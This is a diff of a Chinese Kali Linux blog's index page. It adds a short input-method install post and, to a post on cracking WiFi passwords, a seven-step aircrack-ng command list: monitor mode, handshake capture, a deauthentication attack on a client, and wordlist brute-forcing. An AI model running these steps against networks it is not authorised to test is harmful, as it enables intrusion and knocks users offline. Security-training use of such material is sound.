@@ -78,6 +78,19 @@
 <a href="mailto:wanqian6311@gmail.com" title="Email" rel=" me"><i class="far fa-envelope fa-fw" aria-hidden="true"></i></a>
 </div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/blog/posts/03.kali%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/">kali安装中文输入法</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="https://github.com/wanqian6311" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Levin</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-06-04">2023-06-04</time></span>&nbsp;<span class="post-category">included in <a href="/blog/categories/kali/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Kali</a></span></div><div class="content"><p>#kali中文输入法</p>
+<p>安装输入法框架</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install fcitx
+</span></span></code></pre></div><p>安装谷歌输入法</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install fcitx-googlepinyin
+</span></span></code></pre></div><p>重启</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reboot
+</span></span></code></pre></div></div><div class="post-footer">
+        <a href="/blog/posts/03.kali%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/blog/tags/kali/">Kali</a>,&nbsp;<a href="/blog/tags/%E8%BE%93%E5%85%A5%E6%B3%95/">输入法</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/blog/posts/04.kali%E6%8D%A2%E6%9B%B4%E6%96%B0%E6%BA%90/">kali换更新源</a>
     </h1><div class="post-meta"><span class="post-author"><a href="https://github.com/wanqian6311" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Levin</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2023-06-04">2023-06-04</time></span>&nbsp;<span class="post-category">included in <a href="/blog/categories/kali/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Kali</a></span></div><div class="content"><h1 id="kali安装与优化">kali安装与优化</h1>
@@ -140,23 +153,30 @@ deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/blog/posts/02.%E4%BD%BF%E7%94%A8aircrack-ng%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/">使用Aircrack-ng破解WiFi密码</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/blog/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-04-25">2023-04-25</time></span></div><div class="content"><h1 id="详细步骤">详细步骤</h1>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-04-25">2023-04-25</time></span></div><div class="content"><div class="details admonition abstract open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-list-ul fa-fw" aria-hidden="true"></i>快速通道<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><pre><code>1.安装： apt-get isntall aircrack-ng
+2.查看网卡名字：ifconfig
+3.设置网卡为监听模式：airmon-ng  start wlan0
+4.扫描附近的WIFI：airodump-ng  wlan0mon
+5.选定一个路由器，并监听其流量：airodump-ng -w tplink -c 11 --bssid FF:FF:FF:FF:FF:FF wlan0mon
+6.选定连接的一个客户端，进行攻击：aireplay-ng -0 0 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF  wlan0mon
+7.对抓取到的cap包进行暴力破解：aircrack-ng  -w  password.txt  -b FF:FF:FF:FF:FF:FF handshark-01.cap 
+</code></pre>
+</div>
+        </div>
+    </div>
+<h1 id="详细步骤">详细步骤</h1>
 <h2 id="1安装">1.安装</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">apt-get install aircrack-ng
 </span></span></code></pre></div><h2 id="2aircrack-ng-破解wifi">2.Aircrack-ng 破解WiFi</h2>
 <h3 id="1ifconfig查看网卡信息">1.ifconfig查看网卡信息</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">	ifconfig
 </span></span></code></pre></div><h3 id="2打开网卡监听模式">2.打开网卡监听模式</h3>
-<p>使用<strong>airmon-ng</strong>查看网卡</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">airmon-ng
-</span></span></code></pre></div><p>打开监听模式</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">airmon-ng start wlan0
-</span></span></code></pre></div><p>扫描附近WiFi</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">airodump-ng wlan0mon
-</span></span></code></pre></div><h3 id="3抓握手包">3.抓握手包</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">airodump-ng wlan0mon -c 1 --ivs -w handshark.cap --bssid FF:FF:FF:FF:FF:FF
-</span></span></code></pre></div><p>-c:信道</p>
-<p>&ndash;ivs:初始化向量</p></div><div class="post-footer">
+<p>使用<strong>airmon-ng</strong>查看网卡</p></div><div class="post-footer">
         <a href="/blog/posts/02.%E4%BD%BF%E7%94%A8aircrack-ng%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/">Read More</a></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
